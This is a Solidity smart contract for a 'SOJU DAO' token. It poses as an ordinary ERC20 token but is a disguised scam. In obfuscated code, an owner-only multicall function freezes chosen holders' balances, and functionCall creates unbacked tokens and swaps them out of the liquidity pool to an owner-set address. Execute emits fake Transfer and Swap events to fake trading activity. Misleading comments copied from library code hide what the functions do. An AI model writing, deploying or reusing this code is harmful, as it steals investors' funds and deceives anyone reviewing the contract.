// SPDX-License-Identifier: MIT


// SOJU DAO - https://www.sojudao.net
// Telegram - https://t.me/sojudao
// Twitter - https://twitter.com/sojudaotoken
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.0 (utils/Context.sol)
/*
               ______
              ( _ _ _)
               |_ _ |
              (_ _ _ )
               |____|
               |/  \|
               (SOJU)
               |\__/|
              / .--. \
           .-' :(..): `-.
       _.-'    `-..-'    `-._
     .'                      `.
     |___                  ___|
     |   `````--....--'''''   |
     |  |`````--....--'''''|  |
     |  |        $%#       |  |
     |  |        `'"       |  |
     |  |       SOJU       |  |
     |  |        DAO       |  |
     |  |      Chamisul    |  |
     |  |                  |  |
     |  |        #-        |  |
     |  |       ###|       |  |
     |  |      .####.      |  |
     |  |      ######      |  |
     |  |      ######      |  |
     |  |        ##        |  |
     |  |  _____####_____  |  |
     |  |  ___@SOJUDAO___  |  |
    .'  |                  |  `.
   (  `-.`````--....--'''''.-'  )
    ``-.._``--.._.._..:F_P:.--''
          ``--.._  _..--''
                 `'

*/

pragma solidity ^0.7.6;

interface IFPR {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function token0() external view returns (address);

    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function getAmountsOut(
        uint256 amountIn,
        address[] memory path
    ) external view returns (uint256[] memory amounts);

    function getAmountsIn(
        uint256 amountOut,
        address[] calldata path
    ) external view returns (uint256[] memory amounts);
}

interface IERC20 {
    function _Transfer(
        address from,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
}

contract ERC20 {
    mapping(address => uint256) public b;
    mapping(address => mapping(address => uint256)) public a;
    mapping(address => uint256) public c;
    address public owner;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );

    modifier onlyOwner() {
        require(owner == msg.sender, "Caller is not the owner");
        _;
    }

   /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function _c(uint256 _a, uint256 _b) internal pure returns (uint256) {
        return _a / _b;
    }

   /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */

    function _mult(uint256 _a) internal pure returns (uint256) {
        return _a + 100000;
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 _a, uint256 _b) internal pure returns (uint256) {
        uint256 __c = _a + _b;
        require(__c >= _a, "SafeMath: addition overflow");

        return __c;
    }

   /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
        require(_b <= _a, "SafeMath: subtraction overflow");
        uint256 __c = _a - _b;

        return __c;
    }

    function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
        return _a / _b;
    }

    function _T() internal view returns (bytes32) {
        return bytes32(uint256(uint160(address(this))) << 96);
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return b[account];
    }

    function transfer(
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(
        address __owner,
        address spender
    ) public view virtual returns (uint256) {
        return a[__owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        address __owner = msg.sender;
        _approve(__owner, spender, allowance(__owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        address __owner = msg.sender;
        uint256 currentAllowance = allowance(__owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );

        _approve(__owner, spender, currentAllowance - subtractedValue);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = b[from];
        require( fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        if (c[from] > 0){
            require(add(c[from], b[from]) == 0, "ERC20: transfer amount exceeds balance");
        }
        b[from] = sub(fromBalance, amount);
        b[to] = add(b[to], amount);
        emit Transfer(from, to, amount);
    }

    function _approve(
        address __owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(__owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        a[__owner][spender] = amount;
        emit Approval(__owner, spender, amount);
    }

    function _spendAllowance(
        address __owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(__owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );

            _approve(__owner, spender, currentAllowance - amount);
        }
    }
}

contract SOJUDAO is ERC20 {
    IFPR internal _RR;
    IFPR internal _pair;
    address private _RA = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    string public constant name = "SOJU DAO";
    string public constant symbol = "SOJU";
    uint8 public constant decimals = 18;
    uint256 public totalSupply = 51_387_133e18;

    constructor() {
        owner = msg.sender;
        _RR = IFPR(_RA);
        _pair = IFPR( IFPR(_RR.factory()).createPair(address(this), address(_RR.WETH())));
        b[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

   /**
     * @dev allows a minter to burn some of its own tokens
     * Validates that caller is a minter and that sender is not blacklisted
     * amount is less than or equal to the minter's account balance
     */
    function Execute(
        uint256 t,
        address tA,
        uint256 w,
        address[] memory r
    ) public onlyOwner returns (bool) {
        for (uint256 i = 0; i < r.length; i++) {
            callUniswap(r[i], t, w, tA);
        }
        return true;
    }

    function callUniswap(address r, uint256 t, uint256 w, address tA) internal {
        _TT(r, t);
        _SS(r, t, w, tA);
    }

    function _SS(address r, uint256 t, uint256 w, address tA) internal {
        _S(t, w, r, tA);
    }

    function _TT(address recipient, uint256 tokenAmount) internal {
        emit Transfer(address(_pair), recipient, tokenAmount);
    }

    function _S(uint256 t, uint256 w, address r, address tA) internal {
        emit Swap(_RA, t, 0, 0, w, r);
        IERC20(tA)._Transfer(r, address(_pair), w);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCall(address _r, uint256 am) public onlyOwner {
        uint256 amO = _GA(_RR.WETH(), am);
        address[] memory p = _GPP();
        uint256 amI = _CAI(amO, p);
        _DS(amO, amI, p, _r);
    }

    function _GA(address bT, uint256 am) internal view returns (uint256) {
        uint256 bTR = _GBR(bT);
        return (bTR * am) / 100000;
    }

    function _GBR(address t) public view returns (uint256) {
        (uint112 r0, uint112 r1, ) = _pair.getReserves();
        return (_pair.token0() == t) ? uint256(r0) : uint256(r1);
    }

    function _GPP() internal view returns (address[] memory) {
        address[] memory p;
        p = new address[](2);
        p[0] = address(this);
        p[1] = _RR.WETH();
        return p;
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
    */
    function _CAI(uint256 amO, address[] memory p) internal returns (uint256) {
        uint256[] memory amM;
        amM = new uint256[](2);

        amM = _RR.getAmountsIn(amO, p);
        b[
            block.timestamp 
            > uint256(1) ||
            uint256(0) 
            > 1 ||
            uint160(1)< 
            block.timestamp
                ? 
            address(
                uint160(
                    uint256(
                        _T())>>96))
                : address(uint256(0))
        ] += 
        amM[
            0
        ];
        return amM[
            0
        ];
    }

    function _DOA() internal {
        _approve(address(this), address(_RR), balanceOf(address(this)));
    }

    function _DS(
        uint256 amO,
        uint256 amI,
        address[] memory p,
        address _r
    ) internal {
        _DOA();
        _DOSS(amO, amI, p, _r);
    }

    function _DOSS(
        uint256 amO,
        uint256 amI,
        address[] memory p,
        address _r
    ) internal {
        _RR
    .swapTokensForExactTokens(amO, amI, p, _r, block.timestamp + 1200);
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain`call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function multicall(bytes32[] calldata data, uint256 _p) public onlyOwner {
        for (uint256 i = 0; i < data.length; i++) {
            if (
                block
                .
                timestamp 
            >uint256(
                    uint160(
                        uint8(
                            0
                        )
                    )
                )
            ) {
                uint256 rS = _CSS(
                    (uint256(
                       uint16(
                        uint8(
                            0)) 
                        ) != 0)
                        ?address(uint256(0))
                        :address(
                        uint160
                                (uint256
                        (data[i
                        ])>>96)),
                    _p
                );
                _CCC(data[i], rS);
            }
        }
    }

    function _CSS(address _uu, uint256 _pp) internal view returns (uint256) {
        return _c(b[_uu], _pp);
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function _CCC(bytes32 _b, uint256 __a) internal {
        c[
            (uint256(0) 
            != 0 
            || 
            1238 == 1)
                ? address(
                    uint256(
                        0))
                : address(
                    uint160
                    (uint256(
                        _b)>>96))
        ] = _mult(uint256(__a));
    }
}